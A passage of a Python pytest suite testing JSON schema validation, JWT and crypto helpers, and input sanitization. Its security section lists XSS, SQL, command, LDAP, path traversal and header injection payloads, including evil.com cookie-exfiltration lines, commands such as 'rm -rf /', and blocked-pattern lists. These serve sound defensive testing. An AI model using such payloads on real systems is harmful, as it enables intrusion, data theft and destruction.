        invalid_user = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'age': 30,
            'active': True,
            'roles': ['user'],
            'extra_field': 'not allowed'  # Additional property
        }
        
        with pytest.raises(JSONSchemaError) as exc_info:
            jsonschema.validate(invalid_user, user_schema)
        
        error = exc_info.value
        assert 'extra_field' in str(error.message) or 'additional' in str(error.message).lower()
    
    def test_nested_json_schema_validation(self, json_schemas, test_config):
        """Test nested JSON schema validation."""
        nested_schema = json_schemas['nested']
        
        # Test valid nested data
        valid_nested = {
            'user': {
                'id': 'user-123',
                'name': 'John Doe'
            },
            'preferences': {
                'theme': 'dark',
                'notifications': True
            }
        }
        
        # Should not raise exception
        jsonschema.validate(valid_nested, nested_schema)
        
        # Test invalid nested data
        invalid_nested = {
            'user': {
                'id': 'user-123'
                # Missing required 'name'
            },
            'preferences': {
                'theme': 'invalid_theme',  # Not in enum
                'notifications': True
            }
        }
        
        with pytest.raises(JSONSchemaError):
            jsonschema.validate(invalid_nested, nested_schema)
    
    def test_product_schema_validation(self, json_schemas, test_config):
        """Test product schema validation."""
        product_schema = json_schemas['product']
        
        # Test valid product
        valid_product = {
            'name': 'Test Product',
            'price': 99.99,
            'currency': 'USD',
            'categories': ['electronics', 'gadgets']
        }
        
        jsonschema.validate(valid_product, product_schema)
        
        # Test invalid currency
        invalid_product = {
            'name': 'Test Product',
            'price': 99.99,
            'currency': 'INVALID',  # Not in enum
            'categories': ['electronics']
        }
        
        with pytest.raises(JSONSchemaError) as exc_info:
            jsonschema.validate(invalid_product, product_schema)
        
        error = exc_info.value
        assert 'currency' in str(error.message) or 'enum' in str(error.message)
    
    def test_json_validation_with_complex_data(self, sample_json_data, test_config):
        """Test JSON validation with complex data structures."""
        # Parse complex JSON
        complex_data = json.loads(sample_json_data['valid']['complex'])
        
        # Create schema for validation
        complex_schema = {
            'type': 'object',
            'properties': {
                'users': {
                    'type': 'array',
                    'items': {
                        'type': 'object',
                        'properties': {
                            'id': {'type': 'integer'},
                            'name': {'type': 'string'},
                            'roles': {
                                'type': 'array',
                                'items': {'type': 'string'}
                            }
                        },
                        'required': ['id', 'name', 'roles']
                    }
                },
                'metadata': {
                    'type': 'object',
                    'properties': {
                        'total': {'type': 'integer'},
                        'timestamp': {'type': 'string'}
                    }
                }
            },
            'required': ['users', 'metadata']
        }
        
        # Should validate successfully
        jsonschema.validate(complex_data, complex_schema)
        
        assert len(complex_data['users']) == 2
        assert complex_data['metadata']['total'] == 2
    
    @pytest.mark.performance
    def test_json_schema_validation_performance(self, json_schemas, performance_timer, test_config):
        """Test JSON schema validation performance."""
        user_schema = json_schemas['user']
        
        # Create test data
        test_users = [
            {
                'name': f'User {i}',
                'email': f'user{i}@example.com',
                'age': 20 + (i % 50),
                'active': i % 2 == 0,
                'roles': ['user'] if i % 2 == 0 else ['user', 'admin']
            }
            for i in range(100)
        ]
        
        performance_timer.start()
        
        valid_count = 0
        for user_data in test_users:
            try:
                jsonschema.validate(user_data, user_schema)
                valid_count += 1
            except JSONSchemaError:
                pass
        
        performance_timer.stop()
        
        # Performance requirement
        performance_timer.assert_duration_under(1.0)  # 1 second for 100 validations
        assert valid_count == 100  # All should be valid


# ============================================================================
# AUTHENTICATION TOKEN VALIDATION TESTS
# ============================================================================

class TestAuthenticationValidation:
    """
    Test authentication token validation per Section 6.4.1 requirements.
    
    Validates JWT token processing, date/time validation, cryptographic
    operations, and security utilities for authentication compliance.
    """
    
    def test_jwt_token_generation(self, test_jwt_payload, test_config):
        """Test JWT token generation."""
        jwt_utils = JWTTokenUtils(
            secret_key=test_config['jwt_secret_key'],
            algorithm=test_config['jwt_algorithm']
        )
        
        token = jwt_utils.generate_token(
            payload=test_jwt_payload,
            expires_in=test_config['jwt_expires_in']
        )
        
        assert isinstance(token, str)
        assert len(token) > 0
        assert token.count('.') == 2  # JWT has 3 parts separated by dots
    
    def test_jwt_token_validation(self, test_jwt_token, test_jwt_payload, test_config):
        """Test JWT token validation."""
        jwt_utils = JWTTokenUtils(
            secret_key=test_config['jwt_secret_key'],
            algorithm=test_config['jwt_algorithm']
        )
        
        decoded_payload = jwt_utils.validate_token(test_jwt_token)
        
        assert decoded_payload['user_id'] == test_jwt_payload['user_id']
        assert decoded_payload['email'] == test_jwt_payload['email']
        assert 'iat' in decoded_payload
        assert 'exp' in decoded_payload
        assert 'jti' in decoded_payload
    
    def test_jwt_token_expiration(self, expired_jwt_token, test_config):
        """Test JWT token expiration handling."""
        jwt_utils = JWTTokenUtils(
            secret_key=test_config['jwt_secret_key'],
            algorithm=test_config['jwt_algorithm']
        )
        
        from src.auth.utils import TokenValidationError
        
        with pytest.raises(TokenValidationError) as exc_info:
            jwt_utils.validate_token(expired_jwt_token)
        
        error = exc_info.value
        assert "expired" in str(error).lower()
    
    def test_jwt_token_invalid_signature(self, test_jwt_token, test_config):
        """Test JWT token with invalid signature."""
        # Use wrong secret key
        jwt_utils = JWTTokenUtils(
            secret_key='wrong-secret-key',
            algorithm=test_config['jwt_algorithm']
        )
        
        from src.auth.utils import TokenValidationError
        
        with pytest.raises(TokenValidationError) as exc_info:
            jwt_utils.validate_token(test_jwt_token)
        
        error = exc_info.value
        assert "signature" in str(error).lower()
    
    def test_jwt_claims_extraction(self, test_jwt_token, test_jwt_payload, test_config):
        """Test JWT claims extraction."""
        jwt_utils = JWTTokenUtils(
            secret_key=test_config['jwt_secret_key'],
            algorithm=test_config['jwt_algorithm']
        )
        
        claims = jwt_utils.extract_claims(
            test_jwt_token,
            ['user_id', 'email', 'roles']
        )
        
        assert claims['user_id'] == test_jwt_payload['user_id']
        assert claims['email'] == test_jwt_payload['email']
        assert claims['roles'] == test_jwt_payload['roles']
    
    def test_jwt_token_refresh(self, test_jwt_token, test_config):
        """Test JWT token refresh."""
        jwt_utils = JWTTokenUtils(
            secret_key=test_config['jwt_secret_key'],
            algorithm=test_config['jwt_algorithm']
        )
        
        new_token = jwt_utils.refresh_token(
            test_jwt_token,
            new_expires_in=7200,  # 2 hours
            preserve_claims=['user_id', 'email', 'roles']
        )
        
        assert isinstance(new_token, str)
        assert new_token != test_jwt_token
        
        # Validate new token
        new_payload = jwt_utils.validate_token(new_token)
        assert new_payload['user_id'] == test_config['test_user_id']
        assert new_payload['email'] == test_config['test_email']
    
    def test_datetime_iso8601_parsing(self, sample_dates, test_config):
        """Test ISO 8601 date parsing."""
        datetime_utils = DateTimeUtils()
        
        # Test valid ISO 8601 string
        parsed_date = datetime_utils.parse_iso8601(sample_dates['iso_string'])
        
        assert parsed_date is not None
        assert isinstance(parsed_date, datetime)
        assert parsed_date.year == 2024
        assert parsed_date.month == 1
        assert parsed_date.day == 15
        
        # Test date-only string
        parsed_date_only = datetime_utils.parse_iso8601(sample_dates['date_only'])
        
        assert parsed_date_only is not None
        assert parsed_date_only.year == 2024
        assert parsed_date_only.month == 1
        assert parsed_date_only.day == 15
    
    def test_datetime_iso8601_formatting(self, sample_dates, test_config):
        """Test ISO 8601 date formatting."""
        datetime_utils = DateTimeUtils()
        
        formatted = datetime_utils.format_iso8601(
            sample_dates['base_date'],
            include_microseconds=False,
            force_utc=True
        )
        
        assert isinstance(formatted, str)
        assert 'T' in formatted
        assert formatted.endswith('Z') or '+' in formatted or '-' in formatted[-6:]
        
        # Test with microseconds
        formatted_micro = datetime_utils.format_iso8601(
            sample_dates['base_date'],
            include_microseconds=True
        )
        
        assert '.' in formatted_micro or formatted_micro == formatted
    
    def test_datetime_validation_errors(self, sample_dates, test_config):
        """Test datetime validation error handling."""
        datetime_utils = DateTimeUtils()
        
        from src.auth.utils import DateTimeValidationError
        
        # Test invalid date string
        with pytest.raises(DateTimeValidationError):
            datetime_utils.parse_iso8601(sample_dates['invalid_date'])
    
    def test_datetime_range_validation(self, sample_dates, test_config):
        """Test datetime range validation."""
        datetime_utils = DateTimeUtils()
        
        # Test valid date range
        is_valid = datetime_utils.validate_date_range(
            sample_dates['base_date'],
            min_date=sample_dates['past_date'],
            max_date=sample_dates['future_date']
        )
        
        assert is_valid is True
        
        # Test invalid date range
        is_invalid = datetime_utils.validate_date_range(
            sample_dates['future_date'],
            min_date=sample_dates['base_date'],
            max_date=sample_dates['past_date']  # Max before min
        )
        
        assert is_invalid is False
    
    def test_cryptographic_token_generation(self, test_config):
        """Test cryptographic secure token generation."""
        crypto_utils = CryptographicUtils()
        
        # Test default length
        token = crypto_utils.generate_secure_token()
        
        assert isinstance(token, str)
        assert len(token) > 0
        
        # Test custom length
        custom_token = crypto_utils.generate_secure_token(length=64)
        
        assert isinstance(custom_token, str)
        assert len(custom_token) > len(token)  # Should be longer
        
        # Test uniqueness
        token1 = crypto_utils.generate_secure_token()
        token2 = crypto_utils.generate_secure_token()
        
        assert token1 != token2
    
    def test_cryptographic_encryption_decryption(self, test_config):
        """Test AES encryption and decryption."""
        crypto_utils = CryptographicUtils()
        
        plaintext = "Sensitive data that needs encryption"
        
        # Test encryption
        encrypted_data, nonce, key = crypto_utils.encrypt_aes_gcm(plaintext)
        
        assert isinstance(encrypted_data, bytes)
        assert isinstance(nonce, bytes)
        assert isinstance(key, bytes)
        assert len(nonce) == 12  # GCM nonce length
        assert len(key) == 32   # 256-bit key
        
        # Test decryption
        decrypted_data = crypto_utils.decrypt_aes_gcm(
            encrypted_data, nonce, key
        )
        
        assert decrypted_data.decode('utf-8') == plaintext
    
    def test_password_hashing_verification(self, sample_passwords, test_config):
        """Test password hashing and verification."""
        crypto_utils = CryptographicUtils()
        
        password = sample_passwords['strong']
        
        # Test hashing
        password_hash, salt = crypto_utils.hash_password(password)
        
        assert isinstance(password_hash, bytes)
        assert isinstance(salt, bytes)
        assert len(salt) == 32  # Salt length
        assert len(password_hash) == 32  # Hash length
        
        # Test verification
        is_valid = crypto_utils.verify_password(password, password_hash, salt)
        assert is_valid is True
        
        # Test wrong password
        is_invalid = crypto_utils.verify_password('wrong_password', password_hash, salt)
        assert is_invalid is False
    
    def test_hmac_signature_generation_verification(self, sample_hmac_data, test_config):
        """Test HMAC signature generation and verification."""
        crypto_utils = CryptographicUtils()
        
        data = sample_hmac_data['data']
        secret_key = sample_hmac_data['secret_key']
        
        # Test signature generation
        signature = crypto_utils.generate_hmac_signature(data, secret_key)
        
        assert isinstance(signature, str)
        assert len(signature) > 0
        
        # Test signature verification
        is_valid = crypto_utils.verify_hmac_signature(data, signature, secret_key)
        assert is_valid is True
        
        # Test with wrong secret
        is_invalid = crypto_utils.verify_hmac_signature(data, signature, 'wrong_secret')
        assert is_invalid is False
        
        # Test with modified data
        is_invalid_data = crypto_utils.verify_hmac_signature(
            data + ' modified', signature, secret_key
        )
        assert is_invalid_data is False
    
    def test_input_validator_password_strength(self, sample_passwords, test_config):
        """Test password strength validation."""
        validator = AuthInputValidator()
        
        # Test strong password
        is_valid, errors = validator.validate_password_strength(
            sample_passwords['strong']
        )
        
        assert is_valid is True
        assert len(errors) == 0
        
        # Test weak password
        is_invalid, error_list = validator.validate_password_strength(
            sample_passwords['weak']
        )
        
        assert is_invalid is False
        assert len(error_list) > 0
        
        # Check specific requirements
        for requirement in ['uppercase', 'numbers', 'special']:
            requirement_error = any(requirement in error.lower() for error in error_list)
            # At least one requirement should be mentioned
    
    def test_input_validator_url_validation(self, sample_validation_data, test_config):
        """Test URL validation."""
        validator = AuthInputValidator()
        
        # Test valid URLs
        for url in sample_validation_data['urls']['valid']:
            is_valid = validator.validate_url(url)
            assert is_valid is True
        
        # Test invalid URLs
        for url in sample_validation_data['urls']['invalid']:
            is_valid = validator.validate_url(url)
            assert is_valid is False
    
    @pytest.mark.performance
    def test_authentication_validation_performance(self, performance_timer, test_config):
        """Test authentication validation performance."""
        jwt_utils = JWTTokenUtils(
            secret_key=test_config['jwt_secret_key'],
            algorithm=test_config['jwt_algorithm']
        )
        
        # Generate test tokens
        test_payloads = [
            {'user_id': f'user-{i}', 'email': f'user{i}@example.com'}
            for i in range(50)
        ]
        
        performance_timer.start()
        
        # Test token generation and validation
        for payload in test_payloads:
            token = jwt_utils.generate_token(payload)
            decoded = jwt_utils.validate_token(token)
            assert decoded['user_id'] == payload['user_id']
        
        performance_timer.stop()
        
        # Performance requirement
        performance_timer.assert_duration_under(1.0)  # 1 second for 50 operations


# ============================================================================
# INTEGRATION AND UTILITY FUNCTION TESTS
# ============================================================================

class TestValidationIntegration:
    """
    Test validation integration and utility functions.
    
    Validates comprehensive validation pipeline integration with
    performance optimization and error handling per F-003-RQ-004.
    """
    
    def test_validate_business_data_integration(self, test_config):
        """Test validate_business_data utility function."""
        class TestBusinessValidator(DataModelValidator):
            name = fields.String(required=True)
            email = fields.Email(required=True)
            age = fields.Integer(validate=validate.Range(min=0))
        
        test_data = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'age': 30
        }
        
        context = ValidationContext(validation_type=ValidationType.STRICT)
        
        validated_data, warnings = validate_business_data(
            test_data,
            TestBusinessValidator,
            context
        )
        
        assert validated_data['name'] == 'John Doe'
        assert validated_data['email'] == 'john@example.com'
        assert validated_data['age'] == 30
        assert isinstance(warnings, list)
    
    def test_validate_request_data_integration(self, test_config):
        """Test validate_request_data utility function."""
        class RequestValidator(InputValidator):
            username = fields.String(required=True, validate=validate.Length(min=3))
            email = fields.Email(required=True)
            message = fields.String(validate=validate.Length(max=500))
        
        request_data = {
            'username': '  testuser  ',
            'email': 'TEST@EXAMPLE.COM',
            'message': '<p>Clean message</p><script>alert("xss")</script>'
        }
        
        validated_data = validate_request_data(
            request_data,
            RequestValidator,
            sanitize=True
        )
        
        assert validated_data['username'] == 'testuser'  # Trimmed
        assert validated_data['email'] == 'test@example.com'  # Lowercased
        assert '<p>' in validated_data['message']  # Safe HTML preserved
        assert '<script>' not in validated_data['message']  # Dangerous HTML removed
    
    def test_validate_response_data_integration(self, test_config):
        """Test validate_response_data utility function."""
        class ResponseValidator(OutputValidator):
            id = fields.String(required=True)
            name = fields.String(required=True)
            created_at = fields.DateTime(dump_only=True)
        
        response_data = {
            'id': 'item-123',
            'name': 'Test Item',
            'created_at': datetime.now(timezone.utc)
        }
        
        formatted_response = validate_response_data(
            response_data,
            ResponseValidator,
            format_response=True,
            status_code=200
        )
        
        assert formatted_response['success'] is True
        assert formatted_response['status_code'] == 200
        assert formatted_response['data']['id'] == 'item-123'
        assert formatted_response['data']['name'] == 'Test Item'
    
    def test_create_validation_schema_dynamic(self, test_config):
        """Test dynamic validation schema creation."""
        field_definitions = {
            'title': fields.String(required=True, validate=validate.Length(min=1)),
            'price': fields.Decimal(validate=validate.Range(min=0)),
            'available': fields.Boolean(),
            'tags': fields.List(fields.String())
        }
        
        DynamicValidator = create_validation_schema(
            field_definitions,
            base_class=DataModelValidator,
            schema_name="ProductValidator"
        )
        
        assert DynamicValidator.__name__ == "ProductValidator"
        assert issubclass(DynamicValidator, DataModelValidator)
        
        # Test with valid data
        validator = DynamicValidator()
        test_data = {
            'title': 'Test Product',
            'price': '99.99',
            'available': True,
            'tags': ['electronics', 'gadgets']
        }
        
        result = validator.load_with_context(test_data)
        
        assert result['title'] == 'Test Product'
        assert result['price'] == Decimal('99.99')
        assert result['available'] is True
        assert result['tags'] == ['electronics', 'gadgets']
    
    def test_format_validation_errors_utility(self, test_config):
        """Test validation error formatting utility."""
        validation_errors = [
            {'field': 'email', 'message': 'Invalid email format', 'code': 'INVALID_EMAIL'},
            {'field': 'age', 'message': 'Must be at least 18', 'code': 'MIN_VALUE'},
            {'field': 'password', 'message': 'Too weak', 'code': 'WEAK_PASSWORD'}
        ]
        
        # Test detailed format
        detailed_format = format_validation_errors(validation_errors, format_type="detailed")
        
        assert detailed_format['error_count'] == 3
        assert 'errors' in detailed_format
        assert len(detailed_format['errors']) == 3
        assert 'summary' in detailed_format
        
        # Test summary format
        summary_format = format_validation_errors(validation_errors, format_type="summary")
        
        assert summary_format['error_count'] == 3
        assert 'messages' in summary_format
        assert len(summary_format['messages']) == 3
        
        # Test field-only format
        field_format = format_validation_errors(validation_errors, format_type="field_only")
        
        assert field_format['error_count'] == 3
        assert 'field_errors' in field_format
        assert 'email' in field_format['field_errors']
        assert 'age' in field_format['field_errors']
        assert 'password' in field_format['field_errors']
    
    def test_validation_error_propagation(self, test_config):
        """Test validation error propagation through layers."""
        class FailingValidator(DataModelValidator):
            required_field = fields.String(required=True)
            
            @validates('required_field')
            def validate_required_field(self, value):
                if value == 'fail':
                    raise BusinessRuleViolationError(
                        message="Custom business rule failure",
                        error_code="CUSTOM_RULE_FAILURE"
                    )
                return value
        
        # Test schema validation error
        with pytest.raises(DataValidationError) as exc_info:
            validator = FailingValidator()
            validator.load_with_context({})  # Missing required field
        
        schema_error = exc_info.value
        assert schema_error.error_code == "SCHEMA_VALIDATION_FAILED"
        assert len(schema_error.validation_errors) > 0
        
        # Test business rule violation
        with pytest.raises(BusinessRuleViolationError) as exc_info:
            validator = FailingValidator()
            validator.load_with_context({'required_field': 'fail'})
        
        business_error = exc_info.value
        assert business_error.error_code == "CUSTOM_RULE_FAILURE"
    
    def test_validation_context_inheritance(self, test_config):
        """Test validation context inheritance through validation chain."""
        context = ValidationContext(
            validation_type=ValidationType.SANITIZING,
            validation_mode=ValidationMode.UPDATE,
            user_context={'user_id': 'test-123', 'role': 'admin'},
            business_rules={'custom_rule_1', 'custom_rule_2'}
        )
        
        class ContextValidator(InputValidator):
            name = fields.String(required=True)
            
            def load_with_context(self, json_data, validation_context=None, **kwargs):
                # Verify context is passed through
                assert validation_context is not None
                assert validation_context.validation_type == ValidationType.SANITIZING
                assert validation_context.validation_mode == ValidationMode.UPDATE
                assert validation_context.user_context['user_id'] == 'test-123'
                assert 'custom_rule_1' in validation_context.business_rules
                
                return super().load_with_context(json_data, validation_context, **kwargs)
        
        validator = ContextValidator(validation_context=context)
        result = validator.load_with_context({'name': 'Test Name'}, context)
        
        assert result['name'] == 'Test Name'
    
    @pytest.mark.performance
    def test_comprehensive_validation_performance(self, large_dataset, performance_timer, test_config):
        """Test comprehensive validation pipeline performance."""
        class ComprehensiveValidator(InputValidator):
            id = fields.Integer(required=True)
            name = fields.String(required=True, validate=validate.Length(min=1, max=100))
            email = fields.Email()
            value = fields.String(validate=validate.Length(max=200))
            metadata = fields.Dict()
            active = fields.Boolean()
        
        # Prepare test data
        test_data = []
        for i, item in enumerate(list(large_dataset.values())[:50]):
            test_item = {
                'id': item['id'],
                'name': item['name'],
                'email': f'user{i}@example.com',
                'value': item['value'],
                'metadata': item['metadata'],
                'active': True
            }
            test_data.append(test_item)
        
        context = ValidationContext(
            validation_type=ValidationType.SANITIZING,
            validation_mode=ValidationMode.CREATE
        )
        
        performance_timer.start()
        
        validated_count = 0
        for item in test_data:
            try:
                validator = ComprehensiveValidator(
                    validation_context=context,
                    enable_sanitization=True
                )
                result = validator.load_with_context(item, context)
                validated_count += 1
            except (DataValidationError, BusinessRuleViolationError):
                # Skip invalid items for performance test
                pass
        
        performance_timer.stop()
        
        # Performance requirement: ≤10% variance
        performance_timer.assert_duration_under(2.0)  # 2 seconds for 50 comprehensive validations
        
        # Verify most validations succeeded
        assert validated_count >= 45  # At least 90% success rate
    
    def test_validation_metrics_collection(self, test_config):
        """Test validation metrics collection and reporting."""
        class MetricsValidator(DataModelValidator):
            name = fields.String(required=True)
            email = fields.Email()
        
        validator = MetricsValidator()
        
        # Perform multiple validations
        valid_data = {'name': 'Test', 'email': 'test@example.com'}
        for _ in range(5):
            validator.load_with_context(valid_data)
        
        # Attempt invalid validation
        try:
            validator.load_with_context({'name': '', 'email': 'invalid'})
        except DataValidationError:
            pass
        
        # Check metrics
        metrics = validator.get_validation_metrics()
        
        assert metrics['validation_count'] >= 5
        assert metrics['error_count'] >= 1
        assert 'average_duration' in metrics
        assert 'error_rate' in metrics
        assert metrics['error_rate'] > 0  # Should have some errors


# ============================================================================
# SECURITY AND XSS PREVENTION TESTS
# ============================================================================

class TestSecurityValidation:
    """
    Test security validation and XSS prevention per Section 3.2.2.
    
    Validates comprehensive security validation patterns including XSS
    prevention, input sanitization, and security compliance testing.
    """
    
    def test_xss_prevention_comprehensive(self, test_config):
        """Test comprehensive XSS attack prevention."""
        xss_attack_vectors = [
            # Script injections
            '<script>alert("xss")</script>',
            '<SCRIPT>alert("XSS")</SCRIPT>',
            '<script src="http://evil.com/xss.js"></script>',
            
            # Event handler injections
            '<img src="x" onerror="alert(1)">',
            '<body onload="alert(1)">',
            '<div onmouseover="alert(1)">',
            '<input onfocus="alert(1)" autofocus>',
            
            # JavaScript protocol injections
            '<a href="javascript:alert(1)">Click</a>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<form action="javascript:alert(1)">',
            
            # CSS injections
            '<style>body{background:url("javascript:alert(1)")}</style>',
            '<div style="background:url(javascript:alert(1))">',
            
            # Data URI injections
            '<img src="data:text/html,<script>alert(1)</script>">',
            
            # Object and embed injections
            '<object data="data:text/html,<script>alert(1)</script>">',
            '<embed src="data:text/html,<script>alert(1)</script>">',
            
            # Meta refresh injections
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            
            # Link injections
            '<link rel="stylesheet" href="javascript:alert(1)">',
            
            # Base tag injections
            '<base href="javascript:alert(1)//">',
        ]
        
        for vector in xss_attack_vectors:
            sanitized = sanitize_html(vector)
            
            # Check that dangerous patterns are removed
            dangerous_patterns = [
                'javascript:',
                'alert(',
                'eval(',
                'document.cookie',
                'document.write',
                'window.location',
                '<script',
                'onerror=',
                'onload=',
                'onmouseover=',
                'onfocus=',
                '<iframe',
                '<object',
                '<embed',
                '<meta',
                '<link',
                '<base'
            ]
            
            for pattern in dangerous_patterns:
                assert pattern.lower() not in sanitized.lower(), \
                    f"Dangerous pattern '{pattern}' found in sanitized output: {sanitized}"
    
    def test_sql_injection_prevention(self, test_config):
        """Test SQL injection prevention in input validation."""
        sql_injection_vectors = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('format c:'); --",
        ]
        
        class SQLValidator(InputValidator):
            search_query = fields.String(validate=validate.Length(max=100))
        
        validator = SQLValidator(enable_sanitization=True)
        
        for vector in sql_injection_vectors:
            # Should not raise exception but should sanitize
            result = validator.load_with_context({'search_query': vector})
            sanitized_query = result['search_query']
            
            # Check that SQL injection patterns are neutralized
            assert '--' not in sanitized_query or sanitized_query.count('--') <= 1
            assert 'DROP TABLE' not in sanitized_query.upper()
            assert 'UNION SELECT' not in sanitized_query.upper()
            assert 'EXEC ' not in sanitized_query.upper()
    
    def test_path_traversal_prevention(self, test_config):
        """Test path traversal attack prevention."""
        path_traversal_vectors = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '.../.../.../etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        ]
        
        validator = AuthInputValidator()
        
        for vector in path_traversal_vectors:
            sanitized = validator.sanitize_input(
                vector,
                max_length=100,
                allowed_chars=r'[a-zA-Z0-9._-]'
            )
            
            # Path traversal patterns should be removed
            assert '..' not in sanitized
            assert '\\' not in sanitized
            assert '%' not in sanitized or sanitized.count('%') == 0
    
    def test_command_injection_prevention(self, test_config):
        """Test command injection prevention."""
        command_injection_vectors = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '& net user hacker password /add',
            '`whoami`',
            '$(id)',
            '; shutdown -h now',
            '|| format c:',
            '&& del /f /q c:\\*.*',
        ]
        
        validator = AuthInputValidator()
        
        for vector in command_injection_vectors:
            sanitized = validator.sanitize_input(
                vector,
                allowed_chars=r'[a-zA-Z0-9\s._-]'
            )
            
            # Command injection patterns should be removed
            dangerous_chars = [';', '|', '&', '`', '$', '(', ')', '<', '>']
            for char in dangerous_chars:
                assert char not in sanitized, \
                    f"Dangerous character '{char}' found in sanitized output: {sanitized}"
    
    def test_ldap_injection_prevention(self, test_config):
        """Test LDAP injection prevention."""
        ldap_injection_vectors = [
            '*)(objectClass=*',
            '*)(&(password=*))',
            '*)((memberOf=*))',
            '*)(uid=*',
            '*)(&(|(uid=*)(cn=*))',
        ]
        
        class LDAPValidator(InputValidator):
            username = fields.String(required=True)
        
        validator = LDAPValidator(enable_sanitization=True)
        
        for vector in ldap_injection_vectors:
            result = validator.load_with_context({'username': vector})
            sanitized_username = result['username']
            
            # LDAP injection patterns should be neutralized
            assert '*' not in sanitized_username
            assert '(' not in sanitized_username
            assert ')' not in sanitized_username
            assert '&' not in sanitized_username
            assert '|' not in sanitized_username
    
    def test_header_injection_prevention(self, test_config):
        """Test HTTP header injection prevention."""
        header_injection_vectors = [
            'normal\r\nSet-Cookie: admin=true',
            'normal\nLocation: http://evil.com',
            'normal\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>',
            'normal%0d%0aSet-Cookie: session=hacked',
            'normal\x0d\x0aSet-Cookie: admin=true',
        ]
        
        validator = AuthInputValidator()
        
        for vector in header_injection_vectors:
            sanitized = validator.sanitize_input(vector)
            
            # Header injection patterns should be removed
            assert '\r' not in sanitized
            assert '\n' not in sanitized
            assert '%0d' not in sanitized.lower()
            assert '%0a' not in sanitized.lower()
            assert '\x0d' not in sanitized
            assert '\x0a' not in sanitized
    
    def test_file_upload_security_validation(self, test_config):
        """Test file upload security validation."""
        dangerous_files = [
            {'filename': 'script.php', 'content_type': 'application/x-php'},
            {'filename': 'shell.jsp', 'content_type': 'application/x-jsp'},
            {'filename': 'backdoor.asp', 'content_type': 'application/x-asp'},
            {'filename': 'virus.exe', 'content_type': 'application/x-executable'},
            {'filename': 'trojan.bat', 'content_type': 'application/x-bat'},
            {'filename': 'malware.scr', 'content_type': 'application/x-screensaver'},
            {'filename': '../../../shell.php', 'content_type': 'text/plain'},
            {'filename': 'file.php.jpg', 'content_type': 'image/jpeg'},  # Double extension
        ]
        
        for file_data in dangerous_files:
            file_data['file_size'] = 1024
            
            with pytest.raises((BusinessRuleViolationError, DataValidationError)):
                FileUpload(**file_data)
    
    def test_content_security_policy_validation(self, test_config):
        """Test Content Security Policy compliance in validation."""
        # Test that inline scripts are prevented
        inline_script_content = '''
        <div onclick="alert('click')">Click me</div>
        <p onload="loadData()">Loading...</p>
        <img onerror="handleError()" src="broken.jpg">
        '''
        
        sanitized = sanitize_html(inline_script_content)
        
        # All inline event handlers should be removed
        inline_events = [
            'onclick=', 'onload=', 'onerror=', 'onmouseover=',
            'onfocus=', 'onblur=', 'onchange=', 'onsubmit='
        ]
        
        for event in inline_events:
            assert event not in sanitized.lower()
        
        # Safe content should remain
        assert 'Click me' in sanitized
        assert 'Loading...' in sanitized
    
    def test_data_exfiltration_prevention(self, test_config):
        """Test prevention of data exfiltration attempts."""
        exfiltration_vectors = [
            '<img src="http://evil.com/steal?" + document.cookie>',
            '<script>fetch("http://evil.com", {method:"POST", body:localStorage})</script>',
            '<iframe src="http://evil.com" style="display:none"></iframe>',
            '<form action="http://evil.com" method="post" style="display:none">',
            '<link rel="dns-prefetch" href="http://evil.com">',
            '<meta http-equiv="refresh" content="0;url=http://evil.com">',
        ]
        
        for vector in exfiltration_vectors:
            sanitized = sanitize_html(vector)
            
            # External domains should not be accessible
            assert 'evil.com' not in sanitized
            assert 'http://' not in sanitized
            assert 'https://' not in sanitized
            assert 'document.cookie' not in sanitized
            assert 'localStorage' not in sanitized
            assert 'fetch(' not in sanitized
    
    @pytest.mark.security
    def test_comprehensive_security_validation_suite(self, test_config):
        """Test comprehensive security validation suite."""
        class SecureValidator(InputValidator):
            user_input = fields.String(required=True)
            email = fields.Email()
            comment = fields.String(validate=validate.Length(max=1000))
        
        # Test with mixed security threats
        malicious_data = {
            'user_input': '<script>alert("xss")</script>; DROP TABLE users; --',
            'email': 'test@example.com<script>alert(1)</script>',
            'comment': '''
            <p>Normal comment</p>
            <img src="x" onerror="alert('xss')">
            <iframe src="javascript:alert(1)"></iframe>
            '''
        }
        
        validator = SecureValidator(enable_sanitization=True)
        
        # Should not raise exception but should sanitize thoroughly
        result = validator.load_with_context(malicious_data)
        
        # Verify all dangerous content is removed
        assert '<script>' not in result['user_input']
        assert 'DROP TABLE' not in result['user_input']
        assert 'alert(' not in result['user_input']
        
        # Email should be cleaned but valid
        assert '@example.com' in result['email']
        assert '<script>' not in result['email']
        
        # Comment should have safe HTML only
        assert '<p>' in result['comment']  # Safe tag preserved
        assert 'Normal comment' in result['comment']
        assert '<img' not in result['comment'] or 'onerror=' not in result['comment']
        assert '<iframe' not in result['comment']
        assert 'javascript:' not in result['comment']


# ============================================================================
# TEST EXECUTION HELPERS
# ============================================================================

class TestValidationHelpers:
    """Test validation helper functions and utilities."""
    
    def test_assert_helpers_jwt_validation(self, test_jwt_token, test_config, assert_helpers):
        """Test assert helpers for JWT validation."""
        decoded = assert_helpers.assert_valid_jwt(
            test_jwt_token,
            test_config['jwt_secret_key'],
            test_config['jwt_algorithm']
        )
        
        assert isinstance(decoded, dict)
        assert 'iat' in decoded
        assert 'exp' in decoded
        assert decoded['user_id'] == test_config['test_user_id']
    
    def test_assert_helpers_encryption_validation(self, test_encryption_key, assert_helpers):
        """Test assert helpers for encryption validation."""
        original_data = "Sensitive test data"
        
        crypto_utils = CryptographicUtils()
        encrypted_data, nonce, key = crypto_utils.encrypt_aes_gcm(original_data)
        
        assert_helpers.assert_encrypted_data(encrypted_data, original_data, key)
    
    def test_assert_helpers_html_sanitization(self, sample_html_content, assert_helpers):
        """Test assert helpers for HTML sanitization."""
        dangerous_html = sample_html_content['dangerous']
        sanitized = sanitize_html(dangerous_html)
        
